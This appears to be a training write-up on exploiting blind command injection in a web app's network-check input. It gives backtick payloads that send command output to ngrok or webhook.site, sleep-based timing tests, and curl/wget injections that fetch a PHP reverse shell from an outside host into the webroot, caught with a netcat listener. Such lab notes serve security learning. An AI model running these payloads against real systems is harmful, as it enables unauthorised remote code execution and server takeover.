## **Overview**

This vulnerability do not provide immediate or direct feedback to the attacker about the success or failure of their malicious actions. In other words, the attacker is "blind" to the results of their actions because they do not receive immediate feedback or error messages that would typically indicate whether their attack was successful or not.


## **Practicals**

### **Enumeration**

#### **Using Ngrok**

- Testing out our first payload `127.0.0.1; ls #` we can see that our `;` is been filtered out and we don't have results

- Start up `Ngrok` with 

```bash
$ ngrok http 80
```

- Navigate back to our website and paste in your **ngrok** link

- Now copy your ngrok link again, navigate to our website and paste in the link in the **Network check** bar as follow and click submit:

```
https://14f0-2c0f-f5c0-600-338b-fc7-aa19-f5d5-d3a.ngrok-free.app?`COMMAND-GOES-HERE`
```

- Navigate to the web interface of `ngrok` and our command should have been executed

#### **Using sleep**

**Note :** we can also use the the `sleep` command to check if we have blind Command injection
  
```HTML
# web-app will sleep for 10 seconds
https://tcm-sec.com?`sleep 10`

# web-app will sleep for 25 seconds
https://tcm-sec.com?`sleep 25`
```


**_Web app will sleep for 50 seconds_**

#### **Using webhook.site**

- navigate to [https://webhook.site](https://webhook.site)
- Copy your **Unique URL**

- Paste as follow to the website

```
https://webhook.site/22162abb-7ad5-4f92-8410-c57c37baad72?`COMMAND-GOES-HERE`
```

- Navigating back to [webhook.site](https://webhook.site) we have `www-data`

> **Note :** After each URL always add a question mark (?) and back tick (``), Don't Forget !!



### **Exploitation**

- Start up a python server

```bash
$ python3 -m http.server 80
```

- Use **Wappalyzer** to check for web technology , so we can determine our reverse shell type, In my case it is `PHP`

- Navigate to [revshells.com](https://revshells.com) , Input your IP and preferred PORT, select your reverse shell type then click the save Icon ðŸ’¾

- Save your reverse shell file to where you started up your python server earlier

- Start up your listener using netcat - `nc -lvnp 4444`
- Now navigate to the website and upload your shell using `curl` or `wget`

```HTML
# for CURL
127.0.0.1?`curl 192.168.0.157:443/shell.php > /var/www/html/shell.php`

# for WGET
127.0.0.1?`wget 192.168.0.157:443/shell.php`
```

- Open up a new tab on that website and type in - **http://URL/shell.php**, where URL is the website address and then shell.php , is the name of the malicious PHP file we uploaded.

- Navigating back to our listener we have a shell on the target system
